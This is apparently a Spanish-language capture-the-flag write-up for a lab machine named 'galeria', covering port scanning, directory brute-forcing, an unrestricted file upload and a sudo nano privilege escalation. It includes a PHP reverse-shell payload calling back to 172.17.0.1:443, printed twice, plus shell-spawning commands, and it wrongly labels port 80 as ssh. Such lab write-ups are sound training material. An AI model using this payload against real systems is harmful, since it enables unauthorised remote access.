# galeria - Writeup

## Resumen

## Paso N1: Reconocimiento
Empezamos escaneando los puertos TCP disponibles con sus respectivos servicios y versiones
```
nmap 172.17.0.2 -sS -sVC -n -Pn -p- --open --min-rate 5000 -oG open_ports
```
<img width="671" height="539" alt="image" src="https://github.com/user-attachments/assets/447475d5-e276-4272-9aa4-86ea6ed82a6d" />

Veremos que están abiertos los puertos 21 y 80 correspondientes respectivamente a ftp y ssh
**Nota del creador:** En esta máquina personalmente no hago uso del servidor ftp, pero es recomendable entrar y experimentar para desarrollar lógica y criterio propio.

## Paso N2: Búsqueda de subdirectorios
La página veremos que es una galería de fotos, no hay pistas ni credenciales sueltas, por lo que procederemos con la búsqueda de subdirectorios. 
```
gobuster dir -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://172.17.0.2/ -x php,html
```
<img width="672" height="523" alt="image" src="https://github.com/user-attachments/assets/02217a10-19cb-4ec0-ac73-8ced14da7844" />

Veremos que está disponible el subdirectorio `/gallery/` el cuál es un **Directory Listing** y que explorando un poco, llegaremos a `handler.php`, el cual al entrar veremos que nos permite subir un archivo.

## Paso N3: Explotando el file uploader
crearemos un pequeño script en `php` el cual al ejecutarse se refleje una reverse shell y lo subimos.
```
echo '<?php system("bash -c '"'"'bash -i >& /dev/tcp/172.17.0.1/443 0>&1'"'"'"); ?>' > script.php
```
Una vez subido, se vera reflejado en `http://172.17.0.2/gallery/uploads/images/`
<img width="611" height="423" alt="image" src="https://github.com/user-attachments/assets/2845f527-dbf6-418a-b339-94f0cf19756b" />

Si entramos al archivo escuchando en el puerto 443 con `nc -lvnp 443` habremos accedido al sistema.

## Paso N4: Accediendo a usuarios
Ya dentro del sistema, empezaremos tratando la terminal.
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```
Una vez tratada, ejecutaremos `sudo -l` y encontraremos `(gallery) NOPASSWD: /bin/nano`
<img width="572" height="174" alt="image" src="https://github.com/user-attachments/assets/eacedecf-628b-47ad-acdd-eb1d99b11da1" />

Por lo que de acuerdo con [GTFObins](https://gtfobins.org/gtfobins/nano/#shell) ejecutaremos los siguiente comando:
```
sudo -u gallery /bin/nano
Ctrl+R Ctrl+X
reset; sh 1>&0 2>&0
```
Y habremos obtenido acceso al usuario `gallery`



raw code
```
nmap 172.17.0.2 -sS -sVC -n -Pn -p- --open --min-rate 5000 -oG open_ports
gobuster dir -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://172.17.0.2/ -x php,html


--- php ---
<?php
system("bash -c 'bash -i >& /dev/tcp/172.17.0.1/443 0>&1'");
?>
---




```
